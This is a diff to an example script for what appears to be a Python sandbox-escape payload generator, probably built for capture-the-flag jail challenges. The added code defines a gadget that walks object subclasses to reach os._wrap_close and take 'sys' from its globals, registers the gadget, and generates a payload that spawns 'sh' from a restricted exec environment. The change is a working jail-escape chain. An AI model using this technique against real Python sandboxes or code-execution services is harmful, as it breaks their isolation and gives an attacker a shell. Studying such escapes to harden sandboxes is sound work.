@@ -26,9 +26,16 @@ assert all(c not in payload for c in '\'"')
 
 print("\n---------\n")
 
-#example get shell full chain
-jailbreak.config(provided=['sys'])
+#example get shell full chain with user gadget
+def sys__user(*, str):
+    return [c for c in ().__class__.__base__.__subclasses__() if 'wrap_close' in str(c)][0].__init__.__globals__['sys']
+
+#reset config so jail has nothing provided and no restrictions
+jailbreak.config()
+#provide sys gadget
+jailbreak.register_user_gadget(sys__user)
+
 payload = jailbreak.get_shell("'sh'")
 print(payload)
-#import sys
-#exec(payload, {'__builtins__': {}, 'sys': sys})
+# import sys
+# exec(payload, {'__builtins__': {}, 'sys': sys})
